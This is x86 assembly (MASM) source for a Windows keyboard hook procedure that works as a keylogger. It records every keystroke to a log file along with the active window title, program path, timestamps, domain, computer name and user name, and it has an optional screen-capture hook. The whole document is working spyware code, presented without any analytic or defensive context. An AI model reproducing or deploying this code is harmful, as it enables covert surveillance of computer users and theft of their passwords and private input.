.code
    KeyBoardProc PROC nCode:DWORD, wParam:DWORD, lParam:DWORD
        LOCAL lpKeyState[256] :BYTE
        LOCAL lpClassName[64] :BYTE
        LOCAL lpCharBuf[32] :BYTE
        LOCAL lpDateBuf[20] :BYTE
        LOCAL lpTimeBuf[20] :BYTE
        LOCAL lpLocalTime :SYSTEMTIME

        lea edi, [lpKeyState]       ; lets zero out our buffers
        push 256/4
        pop ecx
        xor eax, eax
        rep stosd                   ; sets us up for doubleword from EAX

        mov eax, wParam
        
        .if eax != WM_KEYUP && eax != WM_SYSKEYUP; only need WM_KEYDOWN and WM_SYSKEYUP, bypass double logging

            invoke  GetForegroundWindow ; get handle for currently used window ( specific to NT and after )
            
            ; if its not different to last one saved bypass all the headings
            .if [hCurrentWindow] != eax

                mov [hCurrentWindow], eax   ; save it for use now and compare later

                ; get the class name
                invoke  GetClassName, [hCurrentWindow], addr lpClassName, 64

                invoke  GetLocalTime, addr lpLocalTime

                invoke  GetDateFormat, 0, 0, addr lpLocalTime, addr hDateFormat, addr lpDateBuf, 12
               
                invoke  GetTimeFormat, 0, 0, addr lpLocalTime, addr hTimeFormat, addr lpTimeBuf, 12

                ; get the processid that sent the key using the HWND we got earlier from
                ; our GetForegroundWindow call we need it to get the program exe name 
                invoke  GetWindowThreadProcessId, addr hCurrentWindow, addr hCurrentThreadPiD

                ; remember we are NOT using a DLL so.....
                ; we need to use ToolHelp procs to get
                ; the program exe name of who sent us this key  
                invoke  CreateToolhelp32Snapshot, TH32CS_SNAPMODULE, [hCurrentThreadPiD]
                mov hSnapShot,eax           ; save the ToolHelp Handle to close later

                mov hModule.dwSize, sizeof MODULEENTRY32; need to initialize size or we will fail 

                ; first Module is always module for process
                ; so safe to assume that the exe file name here
                ; will always be the right one for us              
                invoke  Module32First, [hSnapShot], addr hModule
                
                ; we are done with ToolHelp so we need to tell it we wish to close
                invoke  CloseHandle, [hSnapShot]

                ; find the window title text
                ; use lpKeyState it's not being used yet so
                ; using the HWND we got from GetForegroundWindow
                invoke  GetWindowText, [hCurrentWindow], addr lpKeyState, 256
                IF ADD_CAPTURE_SCREEN_FEATURE
                    invoke  CaptureScreen, addr lpKeyState, addr lpLocalTime
                ENDIF

                push offset hModule.szExePath
                
                lea esi, [lpTimeBuf]        ; print the formatted time 
                push esi
                
                lea esi, [lpDateBuf]        ; print the formatted date
                push esi
                
                pushz 13,10,13,10,"[%s%s - Program: '%s']"
                
                push [hFile] 
                call fprintf                ; write the buffer to cache
                add esp, 3*4

                lea esi, [lpClassName]      ; print the Window Class Name
                push esi
                
                lea esi, [lpKeyState]       ; print the Window Title 
                push esi
                
                pushz 13,10,"[Title: '%s' - Class: '%s']"
                
                push [hFile] 
                call fprintf                ; write the buffer to cache
                add esp, 3*4

                mov hBuffer, 128            ; get the current domain name
                invoke  GetComputerNameEx, 1, addr hDomainName, addr hBuffer

                mov hBuffer, 32             ; get the current computer name 
                invoke  GetComputerNameEx, 0, addr hComputerName, addr hBuffer

                mov hBuffer, 32             ; get the current user name
                invoke  GetUserName, addr hUserName, addr hBuffer

                push offset hUserName       ; print the user name
                push offset hComputerName   ; print the computer name
                push offset hDomainName    ; print the domain name
                pushz 13,10,"[Domain: '%s' - Computer: '%s' - User: '%s']",13,10
                push [hFile]
                call fprintf                ; write to cache
                add esp, 3*4 

                push [hFile]
                call fflush                 ; flush data buffer to disk..
                add esp, 4

            .endif
            
            mov esi, [lParam]           ; we don't want to print shift or capslock names.
            lodsd                       ; it just makes the logs easier to read without them.
            
            cmp al, VK_LSHIFT           ; they are tested later when distinguishing between
            je next_hook                ; bypass left shift Key for upper/lowercase characters
            cmp al, VK_RSHIFT
            je next_hook                ; bypass right shift Key
            cmp al, VK_CAPITAL
            je next_hook                ; bypass caps lock Key
            
            cmp al, VK_ESCAPE 
            je get_name_of_key          ; we Want escape characters
            cmp al, VK_BACK
            je get_name_of_key          ; we want backspace key
            cmp al, VK_TAB 
            je get_name_of_key          ; we want tab key
            ;------------------
            lea edi, [lpCharBuf]        ; zero initialise buffer for key text
            push 32/4
            pop ecx
            xor eax, eax
            rep stosd
            ;------------------
            lea ebx, [lpKeyState]
            push ebx
            call GetKeyboardState       ; get current keyboard state

            push VK_LSHIFT              ; test if left shift key held down
            call GetKeyState
            xchg esi, eax               ; save result in esi

            push VK_RSHIFT              ; test right...
            call GetKeyState
            or eax, esi                 ; al == 1 if either key is DOWN

            mov byte ptr [ebx + 16], al ; toggle a shift key to on/off

            push VK_CAPITAL
            call GetKeyState            ; returns TRUE if caps lock is on 
            mov byte ptr [ebx + 20], al ; toggle caps lock to on/off

            mov esi, [lParam]
            lea edi, [lpCharBuf]
            push 00h
            push edi                    ; buffer for ascii characters
            push ebx                    ; keyboard state
            lodsd
            xchg eax, edx
            lodsd
            push eax                    ; hardware scan code
            push edx                    ; virutal key code
            call ToAscii                ; convert to human readable characters
            test eax, eax               ; if return zero, continue
            jnz test_carriage_return    ; else, write to file.

        get_name_of_key:                ; no need for large table of pointers to get asciiz 
            mov esi, [lParam]
            lodsd                       ; skip virtual key code
            lodsd                       ; eax = scancode
            shl eax, 16
            xchg eax, ecx
            lodsd                       ; extended key info
            shl eax, 24
            or ecx, eax

            push 32
            lea edi, [lpCharBuf]
            push edi
            push ecx
            call GetKeyNameTextA        ; get the key text

            push edi
            pushz "[%s]"                ; print the special key text
            jmp write_to_file

        test_carriage_return:
            push edi
            pushz "%s"                  ; print regular keys

            cmp byte ptr [edi], 0dh     ; carriage return?
            jne write_to_file

            mov byte ptr [edi + 1], 0ah; add linefeed, so logs are easier to read.
            
        write_to_file:
            push [hFile]                ; where we write to the log file
            call fprintf
            add esp, 2*4
        
        .endif
        next_hook:
            push [lParam]               ; reply for possible other hooks waiting
            push [wParam]
            push [nCode]
            push [hHook]
            call CallNextHookEx
            ret

    KeyBoardProc ENDP